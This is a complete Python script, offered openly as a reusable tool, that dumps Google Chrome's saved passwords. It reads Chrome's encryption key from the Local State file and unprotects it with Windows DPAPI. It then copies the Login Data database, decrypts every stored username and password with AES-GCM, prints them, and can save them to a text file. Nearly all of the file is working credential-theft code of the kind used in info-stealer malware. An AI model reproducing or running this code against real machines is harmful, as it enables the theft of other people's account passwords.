import os
import json
import base64
import sqlite3
import sys
import time
import win32crypt
import colorama
from colorama import Fore
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

#functions
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

#super kool animation :D
def anim():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write('\r' + f'{Fore.CYAN}Saving Data {Fore.RESET}'+i)
        sys.stdout.flush()
        time.sleep(0.2)
		
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def main():
    f = open('data.txt', 'a+') #open da file for writing
    key = get_encryption_key() #gets chrome key so we can un-scramble it
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")  #getting path to db
    filename = "ChromeData.db" #we got the file!!
    shutil.copyfile(db_path, filename) 
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created") #sorting db so we can print it in order
    for row in cursor.fetchall():
       #tell our program where each column is 
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
          #printing wowww
            print(" ")
            print(f"{Fore.RED}Origin URL:{Fore.RESET} {origin_url}")
            print(f"{Fore.RED}Action URL:{Fore.RESET} {action_url}")
            print(f"{Fore.RED}Username:{Fore.RESET} {username}")
            print(f"{Fore.RED}Password:{Fore.RESET} {password}")
           #writing to our file, will be deleted if save = n
            f.write("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n \nUsername: %s \nPassword: %s \nOriginal URL: %s \nAction URL: %s \n \n" % (username, password, origin_url, action_url))
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"{Fore.RED}Date created:{Fore.RESET} {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"{Fore.RED}Last used date:{Fore.RESET} {str(get_chrome_datetime(date_last_used))}")
            print(" ")
        print("$"*50) #makes our print look nicer :D
    cursor.close()
    db.close()
    f.close()
    try:
        os.remove(filename) 
    except:
        pass


if __name__ == "__main__":
	os.system('cls')
	main()
	print(" ")
	time.sleep(0.5)
	save = input(f"{Fore.GREEN}Would you like to save this file? y/n: {Fore.RESET}")
	if save == "y": #just prints and ends program, as data is previously written
		print(" ")
		anim()
		print(" ")
		print(" ")
		print(f'{Fore.RED}Data {Fore.RESET}{Fore.CYAN}has been saved to data.txt!{Fore.RESET}') #poggers
		time.sleep(0.5)
		print(" ")
		print(f'{Fore.CYAN}Thanks for using my tool.{Fore.RESET}')
		print(f'{Fore.CYAN}Created by doop#0001{Fore.RESET}')
	else:
		os.remove('data.txt') #removes file because it was already written to
		print(" ")
		print(f'{Fore.CYAN}Program is finished,{Fore.RESET} {Fore.RED}Exiting...{Fore.RESET}')
		time.sleep(2)
		exit() #BYE
    
   #modify this if you want, atleast give me credit or something lol
